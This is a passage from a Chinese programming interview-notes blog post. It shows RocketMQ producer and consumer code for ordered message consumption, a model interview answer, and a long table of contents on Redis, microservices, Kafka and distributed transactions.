<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SendResult result = producer.send(new Message(<span class="string">&quot;OrderTopic&quot;</span>, tag, key, body),<span class="regexp">//</span> Select MessageQueue by orderId <span class="string">``</span>    new <span class="string">``</span>MessageQueueSelector()<span class="string">``</span> &#123;</span><br><span class="line">        <span class="variable">@Override</span> <span class="string">``</span>        public MessageQueue <span class="keyword">select</span>(List&lt;MessageQueue&gt; mqs, Message msg, Object arg) &#123;</span><br><span class="line">            Long orderId = (Long) arg;</span><br><span class="line">            <span class="keyword">int</span> <span class="keyword">index</span> = (<span class="keyword">int</span>) (orderId % mqs.size());</span><br><span class="line">            <span class="keyword">return</span> mqs.get(<span class="keyword">index</span>); <span class="string">``</span>        &#125; <span class="string">``</span>    &#125;, orderId); <span class="regexp">//</span> 传入订单 ID</span><br></pre></td></tr></table></figure>
<ul>
<li>所有相同 <code>orderId</code> 的消息进入同一个队列，保证有序；</li>
<li>即使是多线程发送，由于分队列路由，顺序性仍能保证。</li>
</ul>
<h4 id="👇-Consumer-顺序消费示例：">👇 Consumer 顺序消费示例：</h4>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">consumer.<span class="title function_">registerMessageListener</span>(<span class="keyword">new</span> <span class="title class_">MessageListenerOrderly</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="string">``</span>    <span class="keyword">public</span> <span class="title class_">ConsumeOrderlyStatus</span> <span class="title function_">consumeMessage</span>(<span class="params"><span class="title class_">List</span>&lt;<span class="title class_">MessageExt</span>&gt; msgs, <span class="title class_">ConsumeOrderlyContext</span> context</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="title class_">MessageExt</span> msg : msgs) &#123; <span class="string">``</span>            <span class="string">``</span>log.<span class="property">info</span><span class="string">``</span>(<span class="string">&quot;顺序消费消息：&#123;&#125;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(msg.<span class="title function_">getBody</span>())); <span class="string">``</span>        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">ConsumeOrderlyStatus</span>.<span class="property">SUCCESS</span>; <span class="string">``</span>    &#125; <span class="string">``</span>&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>MessageListenerOrderly</code> 保证 <strong>同一个队列由单线程顺序拉取和消费</strong>；</li>
<li>可配置消费失败的重试次数和处理逻辑。</li>
</ul>
<h3 id="✅-RocketMQ-面试答题话术：">✅ RocketMQ 面试答题话术：</h3>
<blockquote>
<p>RocketMQ 实现顺序消费是通过两端配合完成的：</p>
<ul>
<li>生产端按业务标识（如订单 ID）将消息分配到固定队列；</li>
<li>消费端使用 <code>MessageListenerOrderly</code> 串行消费每个队列，确保顺序性。 整体保证了 <strong>队列内顺序、队列间并发</strong> 的能力。</li>
</ul>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTk2Mjk4N2U0MmRmZjQwYmUwZTk4MmQwNGZlMGM2ZTRfVnFiS1hnYkZTZHhwMFBxWUUwTm1nUTJCNkhEaWVhQXFfVG9rZW46RHZkdGIwSnE0b3N4cGR4WEYwWGMyOEpJbndnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>面试篇</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://www.fomal.cc/posts/0.html">https://www.fomal.cc/posts/0.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>August</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2025-06-08</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2025-06-08</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>面试</a></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/7a776471.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://source.fomal.cc/img/home_bg.webp" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">我的第一篇文章</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><svg class="meta_icon" style="width:22px;height:22px;position:relative;top:5px"><use xlink:href="#icon-mulu1"></use></svg><span style="font-weight:bold">目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Redis面试篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4"><span class="toc-text">搭建主从集群</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86"><span class="toc-text">主从同步原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E4%BC%98%E5%8C%96"><span class="toc-text">主从同步优化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%A8%E5%85%B5%E5%8E%9F%E7%90%86"><span class="toc-text">哨兵原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4"><span class="toc-text">搭建哨兵集群</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RedisTemplate%E8%BF%9E%E6%8E%A5%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4"><span class="toc-text">RedisTemplate连接哨兵集群</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BC%95%E5%85%A5%E4%BE%9D%E8%B5%96"><span class="toc-text">1. 引入依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AE%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4"><span class="toc-text">2. 配置哨兵集群</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%85%8D%E7%BD%AE%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB"><span class="toc-text">3. 配置读写分离</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">代码实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E7%AD%96%E7%95%A5%E8%AF%B4%E6%98%8E"><span class="toc-text">读写策略说明</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B5%8B%E8%AF%95-Redis-%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F"><span class="toc-text">4. 测试 Redis 哨兵模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%AA%8C%E8%AF%81%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB"><span class="toc-text">5. 验证读写分离</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%80%BB%E7%BB%93"><span class="toc-text">6.总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%89%87%E9%9B%86%E7%BE%A4"><span class="toc-text">分片集群</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E5%88%86%E7%89%87%E9%9B%86%E7%BE%A4%E3%80%81%E8%AE%A4%E8%AF%86%E6%95%A3%E5%88%97%E6%8F%92%E6%A7%BD"><span class="toc-text">搭建分片集群、认识散列插槽</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB"><span class="toc-text">故障转移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">redis数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RedisObject"><span class="toc-text">RedisObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SkipList"><span class="toc-text">SkipList</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SortedSet"><span class="toc-text">SortedSet</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6"><span class="toc-text">redis内存回收</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%9C%9FKEY%E5%A4%84%E7%90%86"><span class="toc-text">过期KEY处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SLOW-%E6%A8%A1%E5%BC%8F%E8%A7%84%E5%88%99"><span class="toc-text">SLOW 模式规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FAST-%E6%A8%A1%E5%BC%8F%E8%A7%84%E5%88%99"><span class="toc-text">FAST 模式规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%B7%98%E6%B1%B0%E7%AD%96%E7%95%A5"><span class="toc-text">内存淘汰策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E7%BC%93%E5%AD%98"><span class="toc-text">redis缓存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7"><span class="toc-text">缓存一致性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E6%A8%A1%E5%9E%8B"><span class="toc-text">缓存模型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cache-Aside-%E6%A8%A1%E5%9E%8B"><span class="toc-text">Cache Aside 模型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">工作流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-text">特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%98%E7%82%B9"><span class="toc-text">优点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9"><span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">适用场景</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Read-Write-Through-%E6%A8%A1%E5%9E%8B"><span class="toc-text">Read&#x2F;Write Through 模型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B-2"><span class="toc-text">工作流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E7%82%B9-2"><span class="toc-text">特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%98%E7%82%B9-2"><span class="toc-text">优点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9-2"><span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-2"><span class="toc-text">适用场景</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Behind-Caching-%E6%A8%A1%E5%9E%8B"><span class="toc-text">Write Behind Caching 模型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B-3"><span class="toc-text">工作流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E7%82%B9-3"><span class="toc-text">特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%98%E7%82%B9-3"><span class="toc-text">优点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9-3"><span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF-3"><span class="toc-text">适用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E5%88%A0%E9%99%A4%E7%BC%93%E5%AD%98%E5%86%8D%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">先删除缓存再更新数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%8D%E5%88%A0%E9%99%A4%E7%BC%93%E5%AD%98%EF%BC%9A"><span class="toc-text">先更新数据库再删除缓存：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F"><span class="toc-text">缓存穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E7%A9%BA%E5%80%BC"><span class="toc-text">缓存空值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">布隆过滤器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E6%95%B0%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-text">计数布隆过滤器的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8F%92%E5%85%A5%E5%85%83%E7%B4%A0"><span class="toc-text">1. 插入元素</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%92%E5%85%A5-apple"><span class="toc-text">插入 &quot;apple&quot;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%92%E5%85%A5-banana"><span class="toc-text">插入 &quot;banana&quot;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%92%E5%85%A5-cherry"><span class="toc-text">插入 &quot;cherry&quot;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E8%AF%A2%E5%85%83%E7%B4%A0"><span class="toc-text">2. 查询元素</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2-apple"><span class="toc-text">查询 &quot;apple&quot;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2-grape"><span class="toc-text">查询 &quot;grape&quot;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A0%E9%99%A4%E5%85%83%E7%B4%A0"><span class="toc-text">3. 删除元素</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A0%E9%99%A4-apple"><span class="toc-text">删除 &quot;apple&quot;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A0%E9%99%A4-cherry"><span class="toc-text">删除 &quot;cherry&quot;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%86%8D%E6%9F%A5%E8%AF%A2-apple-%E5%92%8C-cherry"><span class="toc-text">4. 再查询 &quot;apple&quot; 和 &quot;cherry&quot;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9"><span class="toc-text">缓存雪崩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF"><span class="toc-text">缓存击穿</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">微服务面试篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1"><span class="toc-text">分布式事务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CAP%E5%AE%9A%E7%90%86"><span class="toc-text">CAP定理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E8%87%B4%E6%80%A7"><span class="toc-text">一致性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8%E6%80%A7"><span class="toc-text">可用性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8C%BA%E5%AE%B9%E9%94%99%E6%80%A7"><span class="toc-text">分区容错性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%9B%E7%9B%BE"><span class="toc-text">矛盾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BASE%E7%90%86%E8%AE%BA"><span class="toc-text">BASE理论</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BASE-%E7%9A%84%E4%B8%89%E9%83%A8%E5%88%86%E8%A7%A3%E9%87%8A"><span class="toc-text">BASE 的三部分解释</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AT%E6%A8%A1%E5%BC%8F%E7%9A%84%E8%84%8F%E5%86%99%E9%97%AE%E9%A2%98"><span class="toc-text">AT模式的脏写问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XA%E6%A8%A1%E5%BC%8F"><span class="toc-text">XA模式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCC%E6%A8%A1%E5%BC%8F"><span class="toc-text">TCC模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%A4%A7%E5%8A%AA%E5%8A%9B%E9%80%9A%E7%9F%A5"><span class="toc-text">最大努力通知</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-text">注册中心</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%9A%94%E7%A6%BB"><span class="toc-text">环境隔离</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAnamespace"><span class="toc-text">创建namespace</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AEnamespace"><span class="toc-text">微服务配置namespace</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%BA%A7%E6%A8%A1%E5%9E%8B"><span class="toc-text">分级模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Eureka%E5%92%8CNacos"><span class="toc-text">Eureka和Nacos</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="toc-text">远程调用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%8E%9F%E7%90%86"><span class="toc-text">负载均衡原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95"><span class="toc-text">切换负载均衡算法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E4%BF%9D%E6%8A%A4"><span class="toc-text">服务保护</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Java篇</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">计网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mac%E5%9C%B0%E5%9D%80%E5%92%8Cip%E5%9C%B0%E5%9D%80"><span class="toc-text">mac地址和ip地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E8%BF%9E%E6%8E%A5%EF%BC%9A"><span class="toc-text">初始连接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E8%BF%9E%E6%8E%A5%EF%BC%9A"><span class="toc-text">恢复连接：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Spring</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Kafka 和 RocketMQ 的 broker 架构有什么区别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Kafka：多副本机制（Replication Factor）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leader-%E5%92%8C-Follower-%E5%85%A8%E6%8C%82%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-text">Leader 和 Follower 全挂了怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%EF%BC%9F"><span class="toc-text">如何避免？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">RocketMQ：主从模式（Master-Slave）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leader%EF%BC%88Master%EF%BC%89%E5%92%8C-Follower%EF%BC%88Slave%EF%BC%89%E5%85%A8%E6%8C%82%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-text">Leader（Master）和 Follower（Slave）全挂了怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%EF%BC%9F-2"><span class="toc-text">如何避免？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kafka-%E7%9A%84-ISR%EF%BC%88In-Sync-Replicas%EF%BC%89"><span class="toc-text">Kafka 的 ISR（In-Sync Replicas）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">特点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDFS%EF%BC%88Hadoop-Distributed-File-System%EF%BC%89"><span class="toc-text">HDFS（Hadoop Distributed File System）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E7%82%B9%EF%BC%9A-2"><span class="toc-text">特点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-2"><span class="toc-text">示例：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Synchronized 竞争到锁的具体含义</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Synchronized-%E7%AB%9E%E4%BA%89%E5%88%B0%E9%94%81%E7%9A%84%E5%85%B7%E4%BD%93%E5%90%AB%E4%B9%89"><span class="toc-text">Synchronized 竞争到锁的具体含义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Synchronized-%E7%9A%84%E9%94%81%E5%AF%B9%E8%B1%A1"><span class="toc-text">Synchronized 的锁对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Synchronized-%E7%AB%9E%E4%BA%89%E5%88%B0%E9%94%81%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-text">Synchronized 竞争到锁的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E4%BE%8B%E5%AD%90"><span class="toc-text">具体例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">RPC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%9F-RPC-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">🌟 RPC 的工作流程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">客户端调用（Client Stub）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">请求发送（Request Marshaling &amp; Transmission）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">服务器接收与处理（Server Stub &amp; Execution）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">结果返回（Response Serialization &amp; Transmission）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">客户端接收结果（Response Unmarshaling &amp; Return）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%80-RPC-%E7%9A%84%E6%A0%B8%E5%BF%83%E7%89%B9%E7%82%B9"><span class="toc-text">🚀 RPC 的核心特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A5-RPC-%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">🔥 RPC 的应用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">基于XA的分布式事务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%90%86%E8%A7%A3"><span class="toc-text">✅ 一句话理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%96-%E4%BB%80%E4%B9%88%E6%98%AF-XA-%E5%8D%8F%E8%AE%AE%EF%BC%9F"><span class="toc-text">📖 什么是 XA 协议？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-XA-%E7%9A%84%E5%85%B8%E5%9E%8B%E5%9C%BA%E6%99%AF"><span class="toc-text">🔁 XA 的典型场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E7%A4%BA%E4%BE%8B%E6%B5%81%E7%A8%8B%EF%BC%88%E5%A6%82%E4%B8%8B%E5%9B%BE%E9%80%BB%E8%BE%91%EF%BC%89%EF%BC%9A"><span class="toc-text">🧠 示例流程（如下图逻辑）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E7%BC%BA%E7%82%B9%EF%BC%88%E9%9D%A2%E8%AF%95%E5%BF%85%E9%97%AE%EF%BC%89"><span class="toc-text">⚠️ 缺点（面试必问）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%E9%9D%A2%E8%AF%95%E7%AD%94%E6%B3%95%EF%BC%9A"><span class="toc-text">✅ 总结一句话面试答法：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E5%8E%9F%E6%96%87%EF%BC%9A"><span class="toc-text">📌 原文：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 